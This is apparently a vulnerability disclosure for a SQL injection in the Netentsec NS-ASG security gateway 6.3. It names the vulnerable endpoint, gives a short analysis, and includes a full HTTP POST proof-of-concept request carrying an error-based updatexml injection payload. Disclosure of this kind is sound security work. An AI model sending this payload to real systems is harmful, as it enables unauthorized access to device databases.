Beijing Wangkang Technology Co., Ltd. is a leading provider of network application management equipment in China, focusing on the latest trend research and analysis in the field of network application management. It provides users with advanced network application management technology, products, and solutions, aiming to help users achieve the goal of "using the internet well" in network management.

There is an SQL injection vulnerability in the Netcom NS-ASG application security gateway. Attackers exploit vulnerabilities to cause harm to servers.

official： https://www.netentsec.com/

version:6.3

Vulnerability Path ： /protocol/firewall/deletebuildip.php
analyse as below:
The $Id variable is imported through the variable messagecontent, and then the $Id variable is traversed and directly substituted into the SQL statement without any verification. Causing unauthorized sql injection
<img width="602" alt="图片" src="https://github.com/hundanchen69/cve/assets/124319989/fb160d14-6065-4bd7-9ab1-e786b140d664">




Poc：
```
POST /protocol/index.php HTTP/1.1
Host: 
Cookie: PHPSESSID=bfd2e9f9df564de5860117a93ecd82de
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 129

jsoncontent={"protocolType":"deletebuildip","messagecontent":["2332'+and+(updatexml(1,make_set(3,0x7e,(select+user())),1))%23"]}
```

<img width="582" alt="图片" src="https://github.com/hundanchen69/cve/assets/124319989/2c569bdf-4dae-45cb-b4d9-fded0a8099ab">
